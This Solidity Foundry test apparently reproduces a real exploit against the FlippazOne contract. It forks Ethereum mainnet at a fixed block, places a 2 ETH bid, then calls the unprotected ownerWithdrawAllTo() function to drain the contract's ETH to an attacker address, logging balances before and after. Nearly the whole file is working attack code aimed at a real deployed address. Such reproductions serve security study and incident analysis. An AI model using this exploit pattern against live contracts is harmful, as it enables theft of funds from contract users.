// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Flippaz FlippazOne = Flippaz(0xE85A08Cf316F695eBE7c13736C8Cc38a7Cc3e944);

    function setUp() public {
        cheat.createSelectFork("mainnet", 15_083_765); // fork mainnet at block 15083765
    }

    function testExploit() public {
        address alice = cheat.addr(1);
        emit log_named_uint("Before exploiting, ETH balance of FlippazOne Contract:", address(FlippazOne).balance);
        cheat.prank(msg.sender);
        FlippazOne.bid{value: 2 ether}();
        emit log_named_uint("After bidding, ETH balance of FlippazOne Contract:", address(FlippazOne).balance);

        //Attacker try to call ownerWithdrawAllTo() to drain all ETH from FlippazOne contract
        FlippazOne.ownerWithdrawAllTo(address(alice));
        emit log_named_uint("After exploiting, ETH balance of FlippazOne Contract:", address(FlippazOne).balance);
        emit log_named_uint("ETH balance of attacker Alice:", address(alice).balance);
    }
}
